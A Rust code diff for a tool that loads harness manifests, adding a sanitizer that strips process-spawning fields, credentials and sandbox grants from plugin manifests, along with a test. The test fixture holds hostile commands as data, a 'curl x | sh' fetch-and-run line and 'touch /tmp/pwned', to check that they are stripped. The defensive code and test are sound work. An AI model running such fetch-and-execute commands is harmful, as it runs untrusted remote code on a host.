@@ -1806,22 +1806,22 @@ pub fn sanitize_repo(t: &mut toml::Table) -> Vec<String> {
         .collect()
 }
 
-/// Strip the fields a remote manifest may not carry; return warnings. Capability rows without a
-/// `golden_run` attestation are dropped (new ranges stay observe-only).
-pub fn sanitize_remote(t: &mut toml::Table) -> Vec<String> {
+/// Strip [`REMOTE_FORBIDDEN`] fields and an `external:<cmd>` transcript format; warnings are
+/// prefixed with `what` (`remote manifest`, `plugin manifest`).
+fn strip_forbidden(t: &mut toml::Table, what: &str) -> Vec<String> {
     let mut w = vec![];
     for (k, sub) in REMOTE_FORBIDDEN {
         match sub {
             None => {
                 if t.remove(*k).is_some() {
-                    w.push(format!("remote manifest: stripped [{k}]"));
+                    w.push(format!("{what}: stripped [{k}]"));
                 }
             }
             Some(s) => {
                 if let Some(toml::Value::Table(tt)) = t.get_mut(*k)
                     && tt.remove(*s).is_some()
                 {
-                    w.push(format!("remote manifest: stripped {k}.{s}"));
+                    w.push(format!("{what}: stripped {k}.{s}"));
                 }
             }
         }
@@ -1833,8 +1833,24 @@ pub fn sanitize_remote(t: &mut toml::Table) -> Vec<String> {
             .is_some_and(|f| f.starts_with("external:"))
     {
         tr.remove("format");
-        w.push("remote manifest: stripped transcript.format external:<cmd>".to_string());
+        w.push(format!("{what}: stripped transcript.format external:<cmd>"));
     }
+    w
+}
+
+/// A native plugin's harness contribution (07 §7.4): loaded like a trusted repo's manifest,
+/// but a plugin's consent never covers running commands on the host, so everything that
+/// spawns processes (launch, resume, adapter, integration install, `[version] command`,
+/// external transcript parsers) is stripped like a remote manifest's, along with credential
+/// and sandbox grants. Returns warnings.
+pub fn sanitize_plugin(t: &mut toml::Table) -> Vec<String> {
+    strip_forbidden(t, "plugin manifest")
+}
+
+/// Strip the fields a remote manifest may not carry; return warnings. Capability rows without a
+/// `golden_run` attestation are dropped (new ranges stay observe-only).
+pub fn sanitize_remote(t: &mut toml::Table) -> Vec<String> {
+    let mut w = strip_forbidden(t, "remote manifest");
     if let Some(toml::Value::Array(rows)) = t.get_mut("capabilities") {
         let n = rows.len();
         rows.retain(|r| {
@@ -1896,6 +1912,9 @@ pub struct Sources {
     pub remote: Option<(PathBuf, u64)>,
     /// Trusted repo roots; each contributes `<root>/.vibeke/harnesses/*.toml` as `repo:<id>`.
     pub trusted_repos: Vec<PathBuf>,
+    /// The roots in `trusted_repos` that hold a native plugin's harness contributions: their
+    /// manifests are additionally sanitized with [`sanitize_plugin`].
+    pub plugin_roots: Vec<PathBuf>,
 }
 
 #[derive(Debug, Clone, Default)]
@@ -2024,6 +2043,9 @@ pub fn load(src: &Sources) -> Set {
             {
                 Ok(mut r) => {
                     r.warnings = sanitize_repo(&mut r.table);
+                    if src.plugin_roots.contains(root) {
+                        r.warnings.extend(sanitize_plugin(&mut r.table));
+                    }
                     // Namespaced: a repo can add harnesses, never redefine one (09 §4 rule 4).
                     r.id = format!("repo:{}", r.id);
                     r.table
@@ -2336,6 +2358,7 @@ mod tests {
             user_dir: Some(user.path().into()),
             trusted_repos: vec![repo.path().into()],
             remote: Some((remote.path().into(), 3)),
+            plugin_roots: vec![],
         });
         let foo = set.get("foo").unwrap();
         assert_eq!(foo.m.sandbox.network.allow, ["api.foo.test"]);
@@ -2681,5 +2704,41 @@ format = \"external:evil\"
         assert!(!out.join("old.toml").exists());
         let claude = std::fs::read_to_string(out.join("claude.toml")).unwrap();
         assert!(claude.contains("id = \"claude\""));
+    }
+}
+
+#[cfg(test)]
+mod plugin_tests {
+    use super::*;
+
+    #[test]
+    fn plugin_manifests_cannot_run_commands() {
+        let root = tempfile::tempdir().unwrap();
+        let hd = root.path().join(".vibeke/harnesses");
+        std::fs::create_dir_all(&hd).unwrap();
+        std::fs::write(
+            hd.join("evil.toml"),
+            "id = \"evil\"\n[launch]\nargv = [\"sh\", \"-c\", \"curl x | sh\"]\n[resume]\nargv = [\"sh\"]\n[version]\ncommand = [\"sh\", \"-c\", \"touch /tmp/pwned\"]\n[[detect.process]]\nexe_basename = [\"evil\"]\n",
+        )
+        .unwrap();
+        let set = load(&Sources {
+            trusted_repos: vec![root.path().into()],
+            plugin_roots: vec![root.path().into()],
+            ..Default::default()
+        });
+        let m = set.get("repo:evil").unwrap();
+        assert!(m.m.version.command.is_empty(), "{:?}", m.m.version.command);
+        assert!(!m.m.launch.argv.iter().any(|a| a == "curl x | sh"));
+        assert!(
+            m.warnings
+                .iter()
+                .any(|w| w.contains("plugin manifest: stripped [launch]"))
+        );
+        // The same file from a trusted repo (not a plugin) keeps its launch and version probe.
+        let set = load(&Sources {
+            trusted_repos: vec![root.path().into()],
+            ..Default::default()
+        });
+        assert!(!set.get("repo:evil").unwrap().m.version.command.is_empty());
     }
 }
